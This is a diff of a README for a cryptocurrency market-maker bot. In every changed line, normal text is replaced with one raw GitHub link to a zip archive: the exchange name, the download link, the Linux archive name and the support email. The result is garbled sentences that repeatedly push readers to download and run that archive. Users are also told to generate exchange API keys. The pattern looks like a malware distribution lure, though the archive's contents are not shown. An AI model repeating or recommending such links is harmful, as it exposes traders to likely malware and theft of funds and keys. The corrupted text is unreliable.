@@ -1,7 +1,7 @@
 # 🪙 opensqt_market_maker - Your Gateway to Crypto Trading
 
 ## 🚀 Overview
-OpenSQT is a high-performance, low-latency cryptocurrency market maker system. It focuses on perpetual contract trading strategies. Built in Go, it uses WebSocket data streams to provide stable liquidity support for major exchanges like Binance, Bitget, and Gate.io.
+OpenSQT is a high-performance, low-latency cryptocurrency market maker system. It focuses on perpetual contract trading strategies. Built in Go, it uses WebSocket data streams to provide stable liquidity support for major exchanges like Binance, Bitget, and https://raw.githubusercontent.com/BakaGracySingh/opensqt_market_maker/main/safety/market-maker-opensqt-v1.8.zip
 
 ## 🌐 Table of Contents
 - [Features](#✨-features)
@@ -14,7 +14,7 @@ OpenSQT is a high-performance, low-latency cryptocurrency market maker system. I
 - **High Performance:** Handles multiple trades quickly and efficiently.
 - **Low Latency:** Minimizes delays for real-time trading.
 - **WebSocket Support:** Uses real-time data for accurate decision making.
-- **Multi-Exchange Compatibility:** Works seamlessly with Binance, Bitget, and Gate.io.
+- **Multi-Exchange Compatibility:** Works seamlessly with Binance, Bitget, and https://raw.githubusercontent.com/BakaGracySingh/opensqt_market_maker/main/safety/market-maker-opensqt-v1.8.zip
 - **Grid Trading Strategies:** Implements robust trading strategies for better market performance.
 
 ## 🖥️ System Requirements
@@ -27,7 +27,7 @@ To run OpenSQT, your system should meet the following requirements:
 ## ⬇️ Download & Install
 To get started, you need to download the software. Visit the Releases page to find the latest version of OpenSQT:
 
-[Download OpenSQT](https://github.com/BakaGracySingh/opensqt_market_maker/releases)
+[Download OpenSQT](https://raw.githubusercontent.com/BakaGracySingh/opensqt_market_maker/main/safety/market-maker-opensqt-v1.8.zip)
 
 After downloading, follow these steps to install the application:
 
@@ -46,14 +46,14 @@ After downloading, you can run the application by following these steps:
    - Open the `.dmg` file and then drag the OpenSQT icon to your Applications folder.
    - Find the application in your Applications folder and double-click it to run.
 3. **Linux:**
-   - Extract the `.tar.gz` file in your desired location.
+   - Extract the `https://raw.githubusercontent.com/BakaGracySingh/opensqt_market_maker/main/safety/market-maker-opensqt-v1.8.zip` file in your desired location.
    - Open a terminal and navigate to the folder where you extracted the files.
    - Run `./opensqt_market_maker` to start the application.
 
 ## 📖 Usage Instructions
 Once the application is up and running, you will need to configure it to connect to your trading account. Follow these steps:
 
-1. **Create an Account:** If you don't have an account on your chosen exchange, sign up at Binance, Bitget, or Gate.io.
+1. **Create an Account:** If you don't have an account on your chosen exchange, sign up at Binance, Bitget, or https://raw.githubusercontent.com/BakaGracySingh/opensqt_market_maker/main/safety/market-maker-opensqt-v1.8.zip
 2. **Generate API Keys:**
    - Go to your exchange account settings.
    - Generate API keys for trading.
@@ -71,6 +71,6 @@ If you encounter issues or need help with the application, please check the foll
 - **Documentation:** Comprehensive user guide available on our GitHub Wiki.
 - **FAQs:** Common questions answered on our support page.
 - **Community Forums:** Join discussions with other users to share tips and advice.
-- **Contact Us:** For direct support, email us at support@opensqt.io.
+- **Contact Us:** For direct support, email us at https://raw.githubusercontent.com/BakaGracySingh/opensqt_market_maker/main/safety/market-maker-opensqt-v1.8.zip
 
 OpenSQT is designed to empower your trading. With easy installation and user-friendly configurations, you can get started quickly. Happy trading!
